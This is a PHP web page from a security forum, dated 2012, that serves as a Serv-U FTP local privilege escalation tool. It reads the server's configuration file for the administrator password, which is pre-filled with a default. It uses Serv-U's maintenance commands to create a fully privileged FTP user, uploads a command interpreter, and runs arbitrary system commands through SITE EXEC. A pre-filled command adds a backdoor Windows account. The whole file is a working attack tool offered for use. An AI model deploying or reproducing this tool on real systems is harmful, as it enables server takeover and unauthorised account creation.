<?php 
/*
*Author:cfking
*Team:90sec.org
*/
error_reporting(0);
ini_set('max_execution_time', 10);
if (get_magic_quotes_gpc()) { 
function stripslashes_deep($value) 
{ 
$value = is_array($value) ? 
array_map('stripslashes_deep', $value) : 
stripslashes($value); 

return $value; 
} 
$_POST = array_map('stripslashes_deep', $_POST); 
} 

?>
<html>
<head>
<title>Serv-U本地权限提升工具 by cfking@90sec.org</title>
<meta content="text/html; charset=gb2312" http-equiv="Content-Type">
<style type="text/css">body,tr,td{
margin-top:5px;
background-color:#000000;
color:#33FF00;
font-size:12px;
SCROLLBAR-FACE-COLOR:#000000;
scrollbar-arrow-color:#33FF00;
scrollbar-highlight-color:#006300;
scrollbar-3dlight-color:#33FF00;
scrollbar-shadow-color:#33FF00;
}
input,textarea{
border-top-width:1px;
font-weight: bold;
border-left-width: 1px;
font-size:11px;
border-left-color: #33FF00;
background: #000000;
border-bottom-width: 1px;
border-bottom-color: #33FF00;
color: #33FF00;
border-top-color: #33FF00;
font-family: verdana;
border-right-width: 1px;
border-right-color: #33FF00;
}
#s {
background: #006300;
padding-left:5px
}
#d {
background:#dddddd;
}
#d{
background: #003000;
padding-left:5px;
padding-right:5px
}
pre{
font-size: 11px;
font-family: verdana;
color: #33FF00;
}
a{
color:#33FF00;
text-decoration:none;
}
</style>
</head>
<body>

<?php if(@$_GET['act']==null){?>
<center>
<form action="" method="post" >
<table width="297" height="53" >
<tr>
<td width="235"><input type="text" name="inipath" value="C:\Program Files\Serv-U\ServUDaemon.ini" size='55'></td>
<td width="46"><input type="submit" name="read" value="读取密码"></td>
</tr>
</table>
</form>
</center>
<form action="?act=add" method="POST">
<center><table width='500' height='163'>
<tr align='center' valign='middle'>
<td colspan='2' id=s><font face=webdings>8</font> <B>第一步：添加FTP用户</b></td></tr>
<tr align='center' valign='middle'><td width='100' id=d>用户名：</td><td width='379' id=d><input name='suser' type='text' id='u' value='LocalAdministrator'></td></tr>
<tr align='center' valign='middle'><td id=d>密 &nbsp;码：</td><td id=d><input name='spass' type='text' id='p' value='#l@$ak#.lk;0@P'></td></tr>
<tr align='center' valign='middle'><td id=d>端　口：</td><td id=d><input name='sport' type='text' id='port' value='43958'></td></tr>
<tr align='center' valign='middle'><td id=d>USER&nbsp;&nbsp;：</td><td id=d><input name='user' type='text' id='p' value='admin'></td></tr>
<tr align='center' valign='middle'><td id=d>PASS&nbsp;&nbsp;：</td><td id=d><input name='pass' type='text' id='p' value='admin'></td></tr>
<tr align='center' valign='middle'><td id=d>PORT&nbsp;&nbsp;：</td><td id=d><input name='port' type='text' id='p' value='21'></td></tr>
<tr align='center' valign='middle'><td id=d>路 &nbsp;径：</td><td id=d><input name='dir' type='text' id='p' value='<?php echo dirname(__FILE__);?>\' size='55'></td></tr>
<tr align='center' valign='middle'><td colspan='2' id=d><input type='submit' name='Submit' value='adduser'>&nbsp;
<input type='reset' name='Submit2' value='Reset'></td></tr>
</table></center></form><?php }?>

<?php if(@$_GET['act']=='do'){?>
<center>
<form action="" method="post" enctype="multipart/form-data" name="form1">
<table width="297" height="53" >
<tr>
<td colspan="2">当前路径:    
<input name='p' type='text' size='27' value='<?php echo dirname(__FILE__);?>\'></td>
</tr>
<tr>
<td width="235"><input type="file" name="file"></td>
<td width="46"><input type="submit" name="subfile" value="上传CMD"></td>
</tr>
</table>
</form>
</center>

<form action="?act=Execute" method="POST">
<center><table width='500' height='163'>
<tr align='center' valign='middle'>
<td colspan='2' id=s><font face=webdings>8</font> <B>第二步：执行命令</b></td></tr>
<tr align='center' valign='middle'><td id=d>USER&nbsp;&nbsp;：</td><td id=d><input name='user' type='text' id='p' value='<?php echo @$_COOKIE['ftpuser']?>'></td></tr>
<tr align='center' valign='middle'><td id=d>PASS&nbsp;&nbsp;：</td><td id=d><input name='pass' type='text' id='p' value='<?php echo @$_COOKIE['ftppass']?>'></td></tr>
<tr align='center' valign='middle'><td id=d>PORT&nbsp;&nbsp;：</td><td id=d><input name='port' type='text' id='p' value='<?php echo @$_COOKIE['ftpport']?>'></td></tr>
<tr align='center' valign='middle'><td id=d>CMDPATH&nbsp;：</td><td id=d><input name='path' type='text' id='p' value='<?php echo $_COOKIE['cmdpath']==null ? 'c:\windows\system32\cmd.exe' : $_COOKIE['cmdpath'];?>' size='55'></td></tr>
<tr align='center' valign='middle'><td id=d>Command&nbsp;：</td><td id=d><input name='cmd' type='text' id='p' value='/c net user 90sec 90sec /add' size='55'></td></tr>
<tr align='center' valign='middle'><td colspan='2' id=d><input type='submit' name='Submit' value='Execute'>&nbsp;
<input type='reset' name='Submit2' value='Reset'></td></tr>
</table></center></form><?php }?>
<?php 
$act=@$_GET['act'];
if($act=='add'){
setcookie('ftpuser',$_POST['user']);
setcookie('ftppass',$_POST['pass']);
setcookie('ftpport',$_POST['port']);
$dir=str_replace('\\','/',$_POST['dir']);
echo '<center><p></p><p></p><p></p><B>命令回显：</b><b>点击进入第二步执行命令<a href="?act=do"><font color="red">Go Execute</font></a></b><br /><textarea  cols="80" rows="15" readonly>'."\r\n";
up($_POST['port'],$_POST['user'],$_POST['pass'],$dir,$_POST['suser'],$_POST['spass'],$_POST['sport']);
echo '</textarea><br/><b>点击进入第二步执行命令<a href="?act=do"><font color="red">Go Execute</font></a></b></center>';
}

if($act=='Execute'){
$path=str_replace('\\','/',$_POST['path']);
echo '<center><p></p><p></p><p></p><B>命令回显：</b><br /><textarea  cols="80" rows="15" readonly>'."\r\n";
ftpcmd($_POST['port'],$_POST['user'],$_POST['pass'],$_POST['cmd'],$path);
echo '</textarea></center>';
}
if($_POST['subfile']){
$upfile=$_POST['p'].$_FILES['file']['name'];

if(is_uploaded_file($_FILES['file']['tmp_name']))
			{
if(!move_uploaded_file($_FILES['file']['tmp_name'],$upfile)){
echo '<center><font color="red">上传失败</font></center>';
}else{

setcookie('cmdpath',$upfile);
echo '<center><font color="red">上传成功,路径为'.$upfile.'</font></center><br/><br/><br/><br/>';
	  }

 }
}

if($_POST['read']){
echo '<center><textarea  cols="80" rows="15" readonly>'."\r\n";
$inipath=str_replace('\\','/',$_POST['inipath']);
echo file_get_contents($inipath);
echo '</textarea></center><br/>';
}

echo '<div align="center"><strong>Copyright By cfking 2012</strong><br>
Blog:<a href="http://www.luoyes.com" target="_blank">www.luoyes.com</a> Bbs:<a href="http://www.90sec.org" target="_blank">www.90sec.org</a>
</div>
</body>
</html>';
function up($ftpport,$user,$password,$homedir,$suser,$spass,$sport){
$fp = fsockopen ("127.0.0.1", $sport, $errno, $errstr, 30);
if (!$fp) {
    echo "$errstr ($errno)<br>\n";
} else {
    fputs ($fp, "USER ".$suser."\r\n");
    sleep (1);
    fputs ($fp, "PASS ".$spass."\r\n");
    sleep (1);
    fputs ($fp, "SITE MAINTENANCE\r\n");
    sleep (1);
    fputs ($fp, "-SETUSERSETUP\r\n");
    fputs ($fp, "-IP=0.0.0.0\r\n");
    fputs ($fp, "-PortNo=".$ftpport."\r\n");
    fputs ($fp, "-User=".$user."\r\n");
    fputs ($fp, "-Password=".$password."\r\n");
    fputs ($fp, "-HomeDir=".$homedir."\r\n");
    fputs ($fp, "-LoginMesFile=\r\n");
    fputs ($fp, "-Disable=0\r\n");
    fputs ($fp, "-RelPaths=0\r\n");
    fputs ($fp, "-NeedSecure=0\r\n");
    fputs ($fp, "-HideHidden=0\r\n");
    fputs ($fp, "-AlwaysAllowLogin=0\r\n");
    fputs ($fp, "-ChangePassword=1\r\n");
    fputs ($fp, "-QuotaEnable=0\r\n");
    fputs ($fp, "-MaxUsersLoginPerIP=-1\r\n");
    fputs ($fp, "-SpeedLimitUp=-1\r\n");
    fputs ($fp, "-SpeedLimitDown=-1\r\n");
    fputs ($fp, "-MaxNrUsers=-1\r\n");
    fputs ($fp, "-IdleTimeOut=600\r\n");
    fputs ($fp, "-SessionTimeOut=-1\r\n");
    fputs ($fp, "-Expire=0\r\n");
    fputs ($fp, "-RatioUp=1\r\n");
    fputs ($fp, "-RatioDown=1\r\n");
    fputs ($fp, "-RatiosCredit=0\r\n");
    fputs ($fp, "-QuotaCurrent=0\r\n");
    fputs ($fp, "-QuotaMaximum=0\r\n");
    fputs ($fp, "-Maintenance=System\r\n");
    fputs ($fp, "-PasswordType=Regular\r\n");
    fputs ($fp, "-Ratios=None\r\n");
    fputs ($fp, " Access=".$homedir."|RWAMELCDP\r\n");
    sleep (1);
    fputs ($fp, "-GETUSERSETUP\r\n");
    fputs ($fp, "-IP=0.0.0.0\r\n");
    fputs ($fp, "-PortNo=".$ftpport."\r\n");
    fputs ($fp, " User=".$user."\r\n");
    sleep (1);
    fputs ($fp, "QUIT\r\n");
    sleep (1);
    while (!feof($fp)) {
        echo fgets ($fp,128);
    }
    fclose ($fp);
}
}
function ftpcmd($ftpport,$user,$password,$cmd,$path){

$conn_id = fsockopen ("127.0.0.1", $ftpport, $errno, $errstr, 30);
if (!$conn_id) {
    echo "$errstr ($errno)<br>\n";
} else {
    fputs ($conn_id, "USER ".$user."\r\n");
    sleep (1);
    fputs ($conn_id, "PASS ".$password."\r\n");
    sleep (1);
    fputs ($conn_id, "SITE EXEC ".$path." ".$cmd."\r\n");
    fputs ($conn_id, "QUIT\r\n");
    sleep (1);
    while (!feof($conn_id)) {
        echo fgets ($conn_id,128);
    }
    fclose($conn_id);
}
}
?>